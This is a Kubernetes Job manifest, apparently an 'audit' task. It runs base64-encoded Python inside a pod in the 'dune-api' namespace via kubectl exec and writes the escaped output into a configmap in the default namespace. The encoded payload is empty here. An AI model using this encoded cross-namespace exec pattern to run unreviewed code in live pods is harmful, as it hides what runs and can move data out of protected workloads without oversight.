apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v24
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          POD=$(kubectl get pods -n dune-api -l app=dune-api -o jsonpath='{.items[0].metadata.name}')
          echo "Pod: $POD"
          PYCODE=""
          OUTPUT=$(kubectl exec -n dune-api "$POD" -- python3 -c "import base64; exec(base64.b64decode('$PYCODE').decode())" 2>&1)
          echo "$OUTPUT"
          ESCAPED=$(echo "$OUTPUT" | sed 's/\\\\/\\\\\\\\/g' | sed 's/"/\\\\"/g' | tr '\n' '|')
          PATCH="{\"data\":{\"v24_result\":\"$ESCAPED\"}}"
          kubectl patch configmap dune-audit-result3 -n default --type merge -p "$PATCH"